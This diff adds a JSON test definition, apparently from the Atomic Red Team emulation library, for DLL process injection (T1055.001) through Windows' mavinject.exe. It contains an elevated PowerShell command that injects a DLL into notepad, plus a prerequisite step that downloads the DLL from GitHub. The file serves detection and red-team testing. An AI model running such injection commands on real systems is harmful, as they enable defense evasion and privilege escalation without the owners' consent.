@@ -1,0 +1,43 @@
+{
+    "name": "Process Injection via mavinject.exe",
+    "description": "Windows 10 Utility To Inject DLLS.  Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll. With default arguments, expect to see a MessageBox, with notepad's icon in taskbar. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\nStop-Process -processname notepad\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1055.001",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Dynamic-link Library Injection",
+    "source": "ART",
+    "uuid": "74496461-11a1-4982-b439-4d87a550d254",
+    "arguments": {
+        "process_id": {
+            "description": "PID of input_arguments",
+            "type": "string",
+            "default": "(Start-Process notepad -PassThru).id"
+        },
+        "dll_payload": {
+            "description": "DLL to Inject",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1055.001\\src\\x64\\T1055.001.dll"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n",
+            "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll\" -OutFile \"#{dll_payload}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
